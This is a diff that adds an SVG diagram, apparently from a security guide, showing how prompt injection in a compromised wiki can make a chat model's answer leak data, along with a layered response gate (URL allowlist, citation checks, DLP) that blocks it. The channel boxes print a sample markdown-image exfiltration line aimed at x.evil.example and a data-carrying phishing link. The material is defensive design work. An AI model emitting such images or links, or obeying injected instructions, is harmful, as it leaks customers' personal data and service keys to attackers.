@@ -1,0 +1,90 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="600" viewBox="0 0 1200 600" font-family="Segoe UI, Helvetica, Arial, sans-serif">
+  <title>The response gate: exfiltration channels and controls</title>
+  <defs>
+    <marker id="arr" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
+      <path d="M0,0 L10,5 L0,10 z" fill="#475569"/>
+    </marker>
+    <marker id="arrRed" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
+      <path d="M0,0 L10,5 L0,10 z" fill="#dc2626"/>
+    </marker>
+  </defs>
+  <rect width="1200" height="600" fill="#ffffff"/>
+  <text x="600" y="42" text-anchor="middle" font-size="28" font-weight="bold" fill="#0f172a">The response is a way out: gate it before the screen</text>
+  <text x="600" y="70" text-anchor="middle" font-size="16" fill="#475569">Even with authorized retrieval, injected text can make the answer carry data out</text>
+
+  <!-- Context -->
+  <rect x="40" y="110" width="250" height="150" rx="10" fill="#f8fafc" stroke="#64748b" stroke-width="2"/>
+  <text x="165" y="138" text-anchor="middle" font-size="16" font-weight="bold" fill="#0f172a">Authorized context</text>
+  <text x="58" y="164" font-size="13" fill="#475569">• customer record (PII)</text>
+  <text x="58" y="186" font-size="13" fill="#475569">• runbook with a service key</text>
+  <text x="58" y="208" font-size="13" fill="#475569">• official refund policy</text>
+  <rect x="52" y="220" width="226" height="30" rx="6" fill="#fef2f2" stroke="#dc2626" stroke-width="1.5"/>
+  <text x="165" y="240" text-anchor="middle" font-size="13" fill="#0f172a">compromised wiki: exfil orders</text>
+
+  <!-- Model -->
+  <rect x="330" y="140" width="170" height="90" rx="10" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
+  <text x="415" y="175" text-anchor="middle" font-size="16" font-weight="bold" fill="#0f172a">Model</text>
+  <text x="415" y="198" text-anchor="middle" font-size="13" fill="#475569">writes markdown</text>
+  <line x1="290" y1="185" x2="326" y2="185" stroke="#475569" stroke-width="2" marker-end="url(#arr)"/>
+
+  <!-- Gate -->
+  <rect x="540" y="100" width="380" height="250" rx="12" fill="#f0fdf4" stroke="#16a34a" stroke-width="2.5"/>
+  <text x="730" y="130" text-anchor="middle" font-size="17" font-weight="bold" fill="#0f172a">Response gate (deterministic code)</text>
+  <rect x="560" y="146" width="340" height="56" rx="8" fill="#ffffff" stroke="#16a34a" stroke-width="1.5"/>
+  <text x="575" y="168" font-size="14" font-weight="bold" fill="#0f172a">L1 URL policy</text>
+  <text x="575" y="189" font-size="12" fill="#475569">no remote images; allowlisted links only</text>
+  <rect x="560" y="210" width="340" height="56" rx="8" fill="#ffffff" stroke="#16a34a" stroke-width="1.5"/>
+  <text x="575" y="232" font-size="14" font-weight="bold" fill="#0f172a">L2 Citation validation</text>
+  <text x="575" y="253" font-size="12" fill="#475569">membership (retrieved + authorized) and support</text>
+  <rect x="560" y="274" width="340" height="56" rx="8" fill="#ffffff" stroke="#16a34a" stroke-width="1.5"/>
+  <text x="575" y="296" font-size="14" font-weight="bold" fill="#0f172a">L3 DLP (also on URL-decoded text)</text>
+  <text x="575" y="317" font-size="12" fill="#475569">secret: withhold answer · personal data: mask</text>
+  <line x1="500" y1="185" x2="536" y2="185" stroke="#475569" stroke-width="2" marker-end="url(#arr)"/>
+
+  <!-- User -->
+  <rect x="960" y="140" width="200" height="90" rx="10" fill="#fffbeb" stroke="#d97706" stroke-width="2"/>
+  <text x="1060" y="172" text-anchor="middle" font-size="16" font-weight="bold" fill="#0f172a">Chat UI</text>
+  <text x="1060" y="194" text-anchor="middle" font-size="12" fill="#475569">escapes HTML, strict CSP</text>
+  <text x="1060" y="212" text-anchor="middle" font-size="12" fill="#475569">(img-src limited to own hosts)</text>
+  <line x1="920" y1="185" x2="956" y2="185" stroke="#475569" stroke-width="2" marker-end="url(#arr)"/>
+
+  <!-- Channels -->
+  <text x="40" y="400" font-size="17" font-weight="bold" fill="#0f172a">Channels the gate closes</text>
+  <rect x="40" y="415" width="210" height="130" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
+  <text x="145" y="442" text-anchor="middle" font-size="14" font-weight="bold" fill="#0f172a">Markdown image</text>
+  <text x="145" y="466" text-anchor="middle" font-size="12" fill="#475569">![s](https://x.evil.example</text>
+  <text x="145" y="484" text-anchor="middle" font-size="12" fill="#475569">/p.png?d=DATA)</text>
+  <text x="145" y="512" text-anchor="middle" font-size="12" fill="#475569">zero clicks: the browser</text>
+  <text x="145" y="530" text-anchor="middle" font-size="12" fill="#475569">fetches it (L1)</text>
+
+  <rect x="270" y="415" width="210" height="130" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
+  <text x="375" y="442" text-anchor="middle" font-size="14" font-weight="bold" fill="#0f172a">Link with data</text>
+  <text x="375" y="466" text-anchor="middle" font-size="12" fill="#475569">[Verify your account](...</text>
+  <text x="375" y="484" text-anchor="middle" font-size="12" fill="#475569">?d=DATA)</text>
+  <text x="375" y="512" text-anchor="middle" font-size="12" fill="#475569">one click (L1; L3 catches</text>
+  <text x="375" y="530" text-anchor="middle" font-size="12" fill="#475569">known formats inside)</text>
+
+  <rect x="500" y="415" width="210" height="130" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
+  <text x="605" y="442" text-anchor="middle" font-size="14" font-weight="bold" fill="#0f172a">Secrets and PII</text>
+  <text x="605" y="466" text-anchor="middle" font-size="12" fill="#475569">key or national ID copied</text>
+  <text x="605" y="484" text-anchor="middle" font-size="12" fill="#475569">into the answer</text>
+  <text x="605" y="512" text-anchor="middle" font-size="12" fill="#475569">screen, history, logs (L3)</text>
+
+  <rect x="730" y="415" width="210" height="130" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
+  <text x="835" y="442" text-anchor="middle" font-size="14" font-weight="bold" fill="#0f172a">Citation laundering</text>
+  <text x="835" y="466" text-anchor="middle" font-size="12" fill="#475569">false claim + [doc:official]</text>
+  <text x="835" y="484" text-anchor="middle" font-size="12" fill="#475569">borrows trusted authority</text>
+  <text x="835" y="512" text-anchor="middle" font-size="12" fill="#475569">support check (L2)</text>
+
+  <rect x="960" y="415" width="200" height="130" rx="10" fill="#f8fafc" stroke="#64748b" stroke-width="2"/>
+  <text x="1060" y="442" text-anchor="middle" font-size="14" font-weight="bold" fill="#0f172a">DLP limits</text>
+  <text x="1060" y="466" text-anchor="middle" font-size="12" fill="#475569">misses encoded or</text>
+  <text x="1060" y="484" text-anchor="middle" font-size="12" fill="#475569">translated values and data</text>
+  <text x="1060" y="502" text-anchor="middle" font-size="12" fill="#475569">with no pattern: keep</text>
+  <text x="1060" y="520" text-anchor="middle" font-size="12" fill="#475569">secrets out of the index</text>
+
+  <line x1="165" y1="260" x2="165" y2="300" stroke="#dc2626" stroke-width="2"/>
+  <line x1="165" y1="300" x2="520" y2="300" stroke="#dc2626" stroke-width="2" stroke-dasharray="5 4" marker-end="url(#arrRed)"/>
+  <text x="300" y="292" font-size="12" fill="#dc2626">injected exfil instructions</text>
+  <text x="600" y="578" text-anchor="middle" font-size="13" fill="#475569">Events record types and counts only, never the values. The model proposes; the gate decides.</text>
+</svg>
